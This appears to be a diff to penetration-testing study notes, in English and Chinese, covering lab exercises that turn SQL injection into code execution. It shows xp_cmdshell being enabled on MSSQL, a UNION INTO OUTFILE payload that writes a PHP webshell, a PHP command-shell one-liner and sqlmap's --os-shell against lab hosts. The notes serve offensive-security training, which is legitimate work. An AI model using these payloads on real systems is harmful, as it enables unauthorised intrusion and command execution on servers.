@@ -1670,3 +1670,117 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 ```
 > the application hangs for about three seconds.
             
+### Manual and Automated Code Execution
+#### - Manual Code Execution
+- MSSQL
+>[!Caution]
+the **`xp_cmdshell`** function takes a string and passes it to a command shell for execution.\
+The function returns **any output as rows of text**.\
+be called with the `EXECUTE` keyword instead of `SELECT`.
+default: disable
+ 
+`xp_cmdshell` feature: ([MSSQL:sp_configure](https://learn.microsoft.com/zh-tw/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver16))
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+...
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+```
+> 1. `EXECUTE sp_configure 'show advanced options', 1;`: 開啟 advanced options，可以顯示進階組態選項。
+> 2. `RECONFIGURE`: 將以上變更生效
+> 3. `EXECUTE sp_configure 'xp_cmdshell', 1;`: 啟用 xp_cmdshell (可執行系統層級的命令)
+
+Executing Commands via xp_cmdshell:
+```
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE xp_cmdshell 'whoami';
+output
+---------------------------
+nt service\mssql$sqlexpress
+
+NULL
+```            
+- MySQL
+>[!Caution]
+> various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the `SELECT INTO_OUTFILE` statement to write files on the web server.
+
+UNION payload: writes a webshell
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+> Write a WebShell To Disk via INTO OUTFILE directive
+
+>[!Important]
+> PHP reverse shell: `<? system($_REQUEST['cmd']); ?>`
+
+#### - Automating the Attack (sqlmap)
+>[!Note]
+> Due to its high volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.6.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+...
+[*] starting @ 02:14:54 PM /2022-05-16/
+
+...
+---
+Parameter: user (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
+---
+[14:14:57] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: PHP, PHP 7.3.33, Apache 2.4.52
+back-end DBMS: MySQL >= 5.0.12
+...
+```
+> `-p`: 要測試的參數
+
+Another sqlmap core feature is the `--os-shell` parameter: **full interactive shell**.
+![image](https://hackmd.io/_uploads/r1qN4AtQJg.png)
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+...
+[*] starting @ 02:20:47 PM /2022-05-19/
+
+[14:20:47] [INFO] parsing HTTP request from 'post'
+[14:20:47] [INFO] resuming back-end DBMS 'mysql'
+[14:20:47] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: item (POST)
+...
+---
+...
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+> 4
+[14:20:49] [INFO] using '/var/www/html/tmp' as web server document root
+ ...
+[14:20:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+
+os-shell> pwd
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output: '/var/www/html/tmp'
+```
